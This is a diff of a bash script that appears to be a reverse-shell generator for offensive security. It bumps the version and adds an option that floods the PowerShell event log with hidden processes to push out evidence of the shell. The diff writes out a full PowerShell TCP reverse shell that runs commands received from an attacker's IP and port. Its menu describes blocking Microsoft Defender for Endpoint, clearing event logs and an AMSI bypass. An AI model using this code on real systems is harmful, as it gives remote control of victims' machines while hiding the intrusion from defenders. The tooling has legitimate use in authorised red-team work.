@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 DIR="$1"
-version="1.6.5"
+version="1.6.6"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -688,6 +688,13 @@ if [ $fullamsi == 1 ]
 fi 
 
 
+if [ $logf == 1 ]
+
+        then   
+            logfill="start-job{\$t = \$(\"0\"*32700) ;For (\$i = 0; \$i -lt 155; \$i++) {Start-Process powershell.exe -WindowStyle hidden -Argument \"\$t;Exit\"}};"
+        else 
+            logfill=""
+fi 
 
 
 #Check if Windows
@@ -723,7 +730,8 @@ then
     elif [[ $4 == "tcp" ]]
 then    
     #TCP
-    shell="$AMSIb$disableLog$fAMSIb$func\$$ip='$IP';\$$port=$PORT;\$$socket=New-Object Net.\$$placeh\"Sockets.Socket\"([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);\$$socket.Connect(\$$ip, \$$port);while (\$true) {\$Error.Clear();\$$input = New-Object byte[] \$$socket.ReceiveBufferSize;\$$read=\$$socket.Receive(\$$input);\$$cmd=[text.encoding]::UTF8.GetString(\$$input,0, \$$read);try {\$$output=Invoke-Expression -Command \$$cmd | Out-String;} catch {\$$output = \$_.Exception.Message+([System.Environment]::NewLine);}if (!\$$output) {\$$output = \$Error[0].Exception.Message};\$$info=(\$env:UserName)+'@'+(\$env:COMPUTERNAME)+'.'+(\$env:USERDNSDOMAIN)+([System.Environment]::NewLine)+(get-location)+'>';\$$outbytes=[text.encoding]::UTF8.GetBytes(\$$output+\$$info);if(\$$cmd -eq ''){\$$socket.Close();exit;}else{\$$socket.Send(\$$outbytes);}}"
+    shell="$AMSIb$disableLog$logfill$fAMSIb$func\$$ip='$IP';\$$port=$PORT;\$$socket=New-Object Net.\$$placeh\"Sockets.Socket\"([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);\$$socket.Connect(\$$ip, \$$port);while (\$true) {\$Error.Clear();\$$input = New-Object byte[] \$$socket.ReceiveBufferSize;\$$read=\$$socket.Receive(\$$input);\$$cmd=[text.encoding]::UTF8.GetString(\$$input,0, \$$read);try {\$$output=Invoke-Expression -Command \$$cmd | Out-String;} catch {\$$output = \$_.Exception.Message+([System.Environment]::NewLine);}if (!\$$output) {\$$output = \$Error[0].Exception.Message};\$$info=(\$env:UserName)+'@'+(\$env:COMPUTERNAME)+'.'+(\$env:USERDNSDOMAIN)+([System.Environment]::NewLine)+'PS '+(get-location)+'>';\$$outbytes=[text.encoding]::UTF8.GetBytes(\$$output+\$$info);if(\$$cmd -eq ''){\$$socket.Close();exit;}else{\$$socket.Send(\$$outbytes);}}"
+
 
 else
     #SSL
@@ -2246,18 +2254,27 @@ $(greenprint '11)') Powershell - Core Double URL encoded\n\n"
 echo -n $(cyanprint "OPTIONS")
 if [ "$blockmssense" == 1 ]
 then 
-    echo -ne "\n$(greenprint 'b)') Block Microsoft Defender 365 (ATP) - $(redprint 'On')"
+    echo -ne "\n$(greenprint 'b)') Block Microsoft Defender For Endpoint (Requires Admin) - $(redprint 'On')"
 else 
-    echo -ne "\n$(greenprint 'b)') Block Microsoft Defender 365 (ATP) - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'b)') Block Microsoft Defender For Endpoint (Requires Admin) - $(blueprint 'Off')"
     blockmssense=0
+    
+fi
+
+if [ "$logf" == 1 ]
+then 
+    echo -ne "\n$(greenprint 'r)') Rotate PowerShell Evt. log - $(redprint 'On')"
+else 
+    echo -ne "\n$(greenprint 'r)') Rotate PowerShell Evt. log - $(blueprint 'Off')"
+    logf=0
     
 fi
 
 if [ "$clearlogs" == 1 ]
 then 
-    echo -ne "\n$(greenprint 'c)') Clear Powershell Eventlogs - $(redprint 'On')"
+    echo -ne "\n$(greenprint 'c)') Clear Powershell Eventlogs (Requires Admin) - $(redprint 'On')"
 else 
-    echo -ne "\n$(greenprint 'c)') Clear Powershell Eventlogs - $(blueprint 'Off')"
+    echo -ne "\n$(greenprint 'c)') Clear Powershell Eventlogs (Requires Admin) - $(blueprint 'Off')"
     clearlogs=0
     
     
@@ -2301,7 +2318,7 @@ $(magentaprint 'm)')  Go Back to Main Menu
 $(redprint '0)')  Exit
 
 Choose an option:  "
-    read -r -n 2 ans
+    read -r ans
     case $ans in
     1)
         powershell_s "" "" "w" "$poshproto"
@@ -2391,6 +2408,16 @@ Choose an option:  "
         fi
         submenu_powershell
         ;;
+     r)
+        if [ $logf == 0 ]
+        then 
+            logf=1
+                        
+        else 
+            logf=0
+        fi
+        submenu_powershell
+        ;;
      p)
         submenu_powershell_protocols
         ;;
@@ -2400,7 +2427,7 @@ Choose an option:  "
         printf "
         $(blueprint "About Options")
 
-        b) - Block Microsoft Defender 365 (ATP)
+        b) - Block Microsoft Defender For Endpoint 
         Add a block outgoing rule in windows firewall named nonsense, that blocks MSSense.exe. 
         Requires administrator rights (Remember to cleanup)
 
@@ -2422,6 +2449,11 @@ Choose an option:  "
         Downloads an runs Rastamouse AMSI Bypass. 
         If you enable updog, you can have this file generated and served automatically. 
         You can of course choose to enter a url to any other script you would have run upon connection
+
+        r) Rotate PowerShell Evt. log
+        Starts several new powershell processes, passing a long string then exits. 
+        Effectivily growing the log over the default size of 15MB, 
+        pushing out the log entries showing this shell spawning
 
         p) Protocol
         Choose between TCP, UDP and SSL
@@ -2955,7 +2987,7 @@ $(magentaprint 'm)')  Go Back to Main Menu
 $(redprint '0)')  Exit
 
 Choose an option:  "
-    read -r -n 2 ans
+    read -r ans
     case $ans in
     1)
         nc_binaries "Linux64"
@@ -3098,7 +3130,7 @@ $(magentaprint 'm)')  Go Back to Main Menu
 $(redprint '0)')  Exit
 
 Choose an option:  "
-    read -r -n 2 ans
+    read -r ans
     case $ans in
     1)
         python "python3"
@@ -3188,7 +3220,7 @@ $ngrok_choice
 $(redprint '0)')  Exit
 
 Choose an option:  "
-    read -r -n 2 ans
+    read -r ans
     case $ans in
     1)
         input
